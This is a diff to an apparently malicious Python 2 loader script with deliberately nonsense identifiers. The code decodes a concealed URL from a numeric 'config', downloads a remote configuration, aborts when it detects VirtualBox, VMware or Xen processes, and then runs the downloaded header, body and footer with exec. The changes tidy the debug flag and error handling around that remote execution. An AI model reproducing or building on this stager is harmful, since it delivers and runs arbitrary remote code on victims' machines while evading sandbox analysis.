@@ -55,7 +55,7 @@ import base64
 import urllib
 
  
-__DEBUG__ = True
+_debug = True
 
 
 def main(*args, **kwargs):
@@ -84,7 +84,7 @@ def main(*args, **kwargs):
         IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
         SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
         RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
-        SeamlessGalacticSponges   = lambda x: print(str(x)) if __DEBUG__ else ''
+        SeamlessGalacticSponges   = lambda x: print(str(x)) if _debug else ''
         AccidentalAquaticCat      = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
         AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
         GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
@@ -137,15 +137,17 @@ def main(*args, **kwargs):
                                 else:
                                     SeamlessGalacticSponges('{"{}": "{}"} was not loaded'.format(ZonkedEnthusiasticTadpole, NobleRusticWalrus))
             except Exception as e:
-                if __DEBUG__:
+                if _debug:
                     print("Launch error: {}".format(str(e)))
-            return AccidentalAquaticCat                
+            finally:
+                AccidentalAquaticCat['v'] = '00000000000000000000'
+                return AccidentalAquaticCat                
                 
     s = 'tasklist' if os.name is 'nt' else 'ps'
     c = 0 if os.name is 'nt' else -1
     if 'checkvm' in kwargs:
         if bool([_ for _ in os.environ.keys() if 'VBOX' in _.upper()] + [i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'] if 'checkvm' in args]):
-            if __DEBUG__:
+            if _debug:
                 print('aborting')
             sys.exit(0)
     if 'config' in kwargs:
@@ -168,11 +170,10 @@ def main(*args, **kwargs):
 
 
 if __name__ == '__main__':
-    header, body, footer = main(config=81126388790932157784)
-    if __DEBUG__:
-        try:
-            print("\nHeader:\n{}\n".format(bytes(header)))
-            print("\nBody:\n{}\n".format(bytes(body)))
-            print("\nFooter:\n{}\n".format(bytes(footer)))
-        except: pass
-    exec "\n\n\n".join([header, body, footer])
+    try:
+        header, body, footer = main(config=81126388790932157784)
+        exec "\n\n\n".join([header, body, footer])
+    except Exception as e:
+        if _debug:
+            print("Error: {}".format(str(e)))
+            
